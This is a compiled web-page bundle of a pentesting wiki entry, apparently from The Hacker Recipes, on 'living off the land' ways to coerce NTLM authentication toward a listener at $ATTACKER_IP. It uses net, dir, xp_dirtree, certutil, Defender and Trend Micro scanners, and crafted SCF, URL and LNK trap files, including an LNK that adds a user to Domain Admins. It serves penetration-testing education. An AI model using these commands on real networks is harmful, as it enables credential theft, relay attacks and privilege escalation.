import{_ as o,c as p,a5 as h,G as a,w as t,B as l,o as k,j as s,a as i}from"./chunks/framework.B5CpDqM0.js";const f=JSON.parse('{"title":"üõ†Ô∏è Living off the land","description":"","frontmatter":{"authors":"ShutdownRepo, joker2a, mpgn, nuts7, sckdev"},"headers":[],"relativePath":"ad/movement/mitm-and-coerced-authentications/living-off-the-land.md","filePath":"ad/movement/mitm-and-coerced-authentications/living-off-the-land.md","lastUpdated":1724982529000}'),d={name:"ad/movement/mitm-and-coerced-authentications/living-off-the-land.md"};function c(g,e,u,F,m,y){const n=l("PluginTabsTab"),r=l("PluginTabs");return k(),p("div",null,[e[3]||(e[3]=h(`<h1 id="üõ†Ô∏è-living-off-the-land" tabindex="-1">üõ†Ô∏è Living off the land <a class="header-anchor" href="#üõ†Ô∏è-living-off-the-land" aria-label="Permalink to &quot;üõ†Ô∏è Living off the land&quot;">‚Äã</a></h1><div class="warning custom-block"><p>This is a work-in-progress. It&#39;s indicated with the üõ†Ô∏è emoji in the page name or in the category name</p></div><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">‚Äã</a></h2><blockquote><p>In the physical world, ‚Äúliving off the land‚Äù simply means to survive only by the resources that you can harvest from the natural land. There may be multiple reasons for doing this ‚Äî perhaps you want to get ‚Äúoff the grid,‚Äù or maybe you have something or someone to hide from. Or maybe you just like the challenge of being self-sufficient.</p><p>In the technology world, ‚Äúliving off the land‚Äù (LotL) refers to attacker behavior that uses tools or features that already exist in the target environment. (<a href="https://logrhythm.com/blog/what-are-living-off-the-land-attacks/" target="_blank" rel="noreferrer">source</a>)</p></blockquote><p>There are multiple &quot;living off the land&quot; techniques that can be used to force authentications, to capture hashes, or to relay authentications. In order to use those techniques, testers need to have an initial access to &quot;the land&quot;, i.e. the tools or features the technique uses.</p><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">‚Äã</a></h2><p>Those techniques will usually generate outgoing traffic on SMB or HTTP, hence requiring the attacker to set up an SMB or HTTP server to <a href="./../ntlm/capture">capture</a> or <a href="./../ntlm/relay">relay</a> the authentication (e.g. using tools like <a href="https://github.com/SpiderLabs/Responder" target="_blank" rel="noreferrer">Responder</a> (Python), <a href="https://github.com/Kevin-Robertson/Inveigh" target="_blank" rel="noreferrer">Inveigh</a> (Powershell), <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py" target="_blank" rel="noreferrer">ntlmrelayx</a> (Python) or <a href="https://github.com/Kevin-Robertson/Inveigh" target="_blank" rel="noreferrer">Inveigh-Relay</a> (Powershell)).</p><h3 id="command-execution" tabindex="-1">Command execution <a class="header-anchor" href="#command-execution" aria-label="Permalink to &quot;Command execution&quot;">‚Äã</a></h3><p>On Windows machines, cmdlets like <code>net</code> or <code>dir</code> can be used to make the machine access a remote resource, hence making it authenticate. This leads to an outgoing traffic using SMB.</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">dir</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \\\\</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$ATTACKER_IP</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">\\s</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">omething</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">net</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> use</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \\\\</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$ATTACKER_IP</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">\\s</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">omething</span></span></code></pre></div><p>The rpcping command can also be used to trigger an authentication. The perk of this technique is that the auth won&#39;t carry a signing negotiation flag, hence allowing for relays</p><h3 id="ms-sql-queries-execution" tabindex="-1">MS-SQL queries execution <a class="header-anchor" href="#ms-sql-queries-execution" aria-label="Permalink to &quot;MS-SQL queries execution&quot;">‚Äã</a></h3><p>On MS-SQL (Microsoft SQL) servers, the EXEC method can be used to access a remote SMB share. This leads to an outgoing traffic using SMB.</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">EXEC</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> master.sys.xp_dirtree</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;\\\\$ATTACKER_IP\\something&#39;,1,1</span></span></code></pre></div><h3 id="file-explorer" tabindex="-1">File explorer <a class="header-anchor" href="#file-explorer" aria-label="Permalink to &quot;File explorer&quot;">‚Äã</a></h3><p>On Windows machines, the file explorer can be used to access remote resources like SMB shares by supplying its UNC path (i.e. <code>\\\\$ATTACKER_IP\\something</code>) in the research bar. This leads to an outgoing traffic using SMB.</p><h3 id="internet-browser" tabindex="-1">Internet browser <a class="header-anchor" href="#internet-browser" aria-label="Permalink to &quot;Internet browser&quot;">‚Äã</a></h3><p>Internet browsers can access HTTP servers by supplying their URL (i.e. <code>http://$IP:$PORT/something</code>) in the research bar. This technique is rarely used as it can pop up a prompt. This leads to an outgoing traffic using HTTP.</p><h3 id="html-documents-xss" tabindex="-1">HTML documents / XSS <a class="header-anchor" href="#html-documents-xss" aria-label="Permalink to &quot;HTML documents / XSS&quot;">‚Äã</a></h3><p>HTML documents can be crafted (or injected with content when successfully exploiting an HTML injection attack such as an <a href="./../../../web/inputs/xss">Cross-Site Scripting</a>) in way that could make browsers authenticate when accessing a remote resource. This leads to an outgoing traffic using SMB.</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>![](file://$ATTACKER_IP/something/something.png)</span></span></code></pre></div><h3 id="web-server-file-inclusion" tabindex="-1">Web server file inclusion <a class="header-anchor" href="#web-server-file-inclusion" aria-label="Permalink to &quot;Web server file inclusion&quot;">‚Äã</a></h3><p><a href="https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/" target="_blank" rel="noreferrer">https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/</a></p><h3 id="windows-defender-remote-scanning" tabindex="-1">Windows Defender Remote Scanning <a class="header-anchor" href="#windows-defender-remote-scanning" aria-label="Permalink to &quot;Windows Defender Remote Scanning&quot;">‚Äã</a></h3><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">C:\\ProgramData\\Microsoft\\Windows</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> Defender</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">\\p</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">latform</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">\\4</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">.18.2010.7-0</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">\\M</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">pCmdRun.exe</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -Scan</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -ScanType</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 3</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -File</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \\\\</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$ATTACKER_IP</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">\\f</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">ile.txt</span></span></code></pre></div><h3 id="certutil" tabindex="-1">Certutil <a class="header-anchor" href="#certutil" aria-label="Permalink to &quot;Certutil&quot;">‚Äã</a></h3><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">certutil.exe</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -syncwithWU</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \\\\</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$ATTACKER_IP</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">\\s</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">hare</span></span></code></pre></div><h3 id="trend-micro-remote-scanning" tabindex="-1">Trend Micro Remote Scanning <a class="header-anchor" href="#trend-micro-remote-scanning" aria-label="Permalink to &quot;Trend Micro Remote Scanning&quot;">‚Äã</a></h3><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">C:\\Program</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> Files</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> (x86)</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">\\T</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">rend Micro</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">\\O</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">fficeScan Clien</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">\\P</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">ccNt.exe </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">\\\\</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$ATTACKER_IP</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">\\s\\</span></span></code></pre></div><h3 id="shortcut-files-scf-lnk-url" tabindex="-1">Shortcut files (scf, lnk, url) <a class="header-anchor" href="#shortcut-files-scf-lnk-url" aria-label="Permalink to &quot;Shortcut files (scf, lnk, url)&quot;">‚Äã</a></h3><p>SMB shares can be trapped with shortcut files that will automatically be handled by Windows&#39; file explorer (e.g. a URL shortcut using an icon file located on a remote SMB share will be parsed by the file explorer that will request the icon file and authenticate if necessary). This leads to an outgoing traffic using SMB.</p><div class="tip custom-block"><p>Shares an account has WRITE privileges over can be mapped with <a href="https://github.com/ShawnDEvans/smbmap" target="_blank" rel="noreferrer">smbmap</a> (Python).</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">smbmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -d</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;domain&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;user&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -p</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;password&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --host-file</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> targets.txt</span></span></code></pre></div></div><div class="tip custom-block"><p>Shortcut file names can be preprended with a <code>@</code> symbol to put them on top of the share, to make sure the file explorer has to parse it.</p></div><div class="tip custom-block"><p>The <a href="https://github.com/Greenwolf/ntlm_theft" target="_blank" rel="noreferrer">ntlm_theft</a> (Python) tool can be used to generate multiple file types at once (lnk, scf, url, docx, xslx, htm, xml, pdf, ...).</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">ntlm_theft.py</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --generate</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> all</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --server</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $ATTACKER_IP </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">--filename</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;@FILENAME&quot;</span></span></code></pre></div></div>`,34)),a(r,null,{default:t(()=>[a(n,{label:".lnk"},{default:t(()=>e[0]||(e[0]=[s("p",null,"An LNK shortcut using an icon file located on a remote SMB share will be parsed by the file explorer that will request the icon file and authenticate if necessary.",-1),s("blockquote",null,[s("p",null,[i("Shortcuts with the .lnk extension have a lot of beneficial properties when it comes to stealth; "),s("a",{href:"https://en.wikipedia.org/wiki/Shortcut_(computing)#Microsoft_Windows",target:"_blank",rel:"noreferrer"},"they are an exception"),i(" from the Windows setting to show or hide file extensions. Even when ‚Äúhide known file extensions‚Äù is disabled, explorer.exe will only show the name, allowing us to let it end in ‚Äú.jpeg‚Äù. A major downside is that they only allow 1024 characters for the whole command they execute. ("),s("a",{href:"https://hatching.io/blog/lnk-hta-polyglot/",target:"_blank",rel:"noreferrer"},"source"),i(")")])],-1),s("p",null,[s("a",{href:"https://github.com/Plazmaz/LNKUp",target:"_blank",rel:"noreferrer"},"LNKUp"),i(" (Python) is a great tool to generate malicious LNK shortcuts. They can be set with a remote icon file to generate outgoing SMB traffic and authentications but can also be set to execute commands when opened (i.e. double-clicked).")],-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Simple SMB trap with remote icon file")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"LNKUp.py"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --host"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $ATTACKER_IP "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"--type"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," ntlm"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --output"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," '@CONFIDENTIAL-ACCOUNTS.txt.lnk'")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# SMB trap + command execution")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"LNKUp.py"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --host"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $ATTACKER_IP "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"--type"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," ntlm"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --output"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," '@CONFIDENTIAL-ACCOUNTS.txt.lnk'"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --execute"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},` "net group 'Domain Admins' Pentester01 /domain /add"`)])])])],-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Simple SMB trap with remote icon file (Powershell)")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$objShell = New-Object -ComObject WScript.Shell")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$lnk = $objShell.CreateShortcut("),s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},'"C:\\Windows\\temp\\@Salaries-2023.lnk"'),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},")")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$lnk.TargetPath = "),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"\\\\"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'\\@icon.png"')]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$lnk.WindowStyle = 1")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$lnk.IconLocation = "),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"%windir%\\system32\\shell32.dll, 3"')]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$lnk.Description = "),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"Salaries-2023."')]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$lnk.HotKey = "),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"Ctrl+Alt+O"')]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"$lnk.Save"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"()")])])])],-1),s("div",{class:"tip custom-block"},[s("p",null,"Advanced traps"),s("ul",null,[s("li",null,[i("LNK files can be mixed with some VBA: "),s("a",{href:"https://medium.com/secjuice/pwned-by-a-shortcut-b21473970944",target:"_blank",rel:"noreferrer"},"Pwned by Shortcut")]),s("li",null,[i("LNK files can be mixed with some HTA: "),s("a",{href:"https://hatching.io/blog/lnk-hta-polyglot/",target:"_blank",rel:"noreferrer"},"LNK HTA Polyglot")])])],-1),s("p",null,[s("a",{href:"https://github.com/Pennyw0rth/NetExec",target:"_blank",rel:"noreferrer"},"NetExec"),i(" (Python) can be used to automatically push LNK files to a writeable share.")],-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Creation & upload")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"nxc"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," smb"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "target"'),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -d"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "domain"'),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "user"'),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "password"'),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -M"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," slinky"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -O"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' NAME="SHARE"'),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' SERVER="ATTACKER_IP"')]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Cleanup")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"nxc"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," smb"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "target"'),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -d"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "domain"'),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "user"'),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "password"'),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -M"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," slinky"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -O"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' NAME="SHARE"'),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' SERVER="ATTACKER_IP"'),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," CLEANUP=True")])])])],-1)])),_:1}),a(n,{label:".scf"},{default:t(()=>e[1]||(e[1]=[s("p",null,"An SCF shortcut using an icon file located on a remote SMB share will be parsed by the file explorer that will request the icon file and authenticate if necessary.",-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"[Shell]")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Command"),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"2")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"IconFile"),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"\\\\"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$ATTACKER_IP"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"\\s"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"omething"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"\\s"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"omething.ico")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"[Taskbar]")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Command"),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"ToggleDesktop")])])])],-1)])),_:1}),a(n,{label:".url"},{default:t(()=>e[2]||(e[2]=[s("p",null,"A URL shortcut using an icon file located on a remote SMB share will be parsed by the file explorer that will request the icon file and authenticate if necessary.",-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"[InternetShortcut]")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"URL"),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"https://www.thehacker.recipes/")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"IconIndex"),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"0")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"IconFile"),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"\\\\"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$ATTACKER_IP"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"\\s"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"omething"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"\\s"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"omething.ico")])])])],-1)])),_:1})]),_:1}),e[4]||(e[4]=h('<h3 id="pdf-documents" tabindex="-1">PDF documents <a class="header-anchor" href="#pdf-documents" aria-label="Permalink to &quot;PDF documents&quot;">‚Äã</a></h3><p><a href="https://github.com/deepzec/Bad-Pdf" target="_blank" rel="noreferrer">https://github.com/deepzec/Bad-Pdf</a></p><p><a href="https://github.com/3gstudent/Worse-PDF" target="_blank" rel="noreferrer">https://github.com/3gstudent/Worse-PDF</a></p><h3 id="rtf-documents" tabindex="-1">RTF documents <a class="header-anchor" href="#rtf-documents" aria-label="Permalink to &quot;RTF documents&quot;">‚Äã</a></h3><h3 id="ms-word-documents" tabindex="-1">MS Word documents <a class="header-anchor" href="#ms-word-documents" aria-label="Permalink to &quot;MS Word documents&quot;">‚Äã</a></h3><h3 id="lock-screen-wallpaper" tabindex="-1">Lock screen wallpaper <a class="header-anchor" href="#lock-screen-wallpaper" aria-label="Permalink to &quot;Lock screen wallpaper&quot;">‚Äã</a></h3><p><a href="https://github.com/nccgroup/Change-Lockscreen" target="_blank" rel="noreferrer">https://github.com/nccgroup/Change-Lockscreen</a></p><p><a href="https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation" target="_blank" rel="noreferrer">https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation</a></p><h2 id="resources" tabindex="-1">Resources <a class="header-anchor" href="#resources" aria-label="Permalink to &quot;Resources&quot;">‚Äã</a></h2><p><a href="https://hatching.io/blog/lnk-hta-polyglot/" target="_blank" rel="noreferrer">https://hatching.io/blog/lnk-hta-polyglot/</a></p><p><a href="https://logrhythm.com/blog/what-are-living-off-the-land-attacks/" target="_blank" rel="noreferrer">https://logrhythm.com/blog/what-are-living-off-the-land-attacks/</a></p><p><a href="https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/" target="_blank" rel="noreferrer">https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/</a></p><p><a href="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/" target="_blank" rel="noreferrer">https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/</a></p><p><a href="https://github.com/Gl3bGl4z/All_NTLM_leak" target="_blank" rel="noreferrer">https://github.com/Gl3bGl4z/All_NTLM_leak</a></p><p><a href="https://mgp25.com/research/infosec/Leaking-NTLM-hashes/" target="_blank" 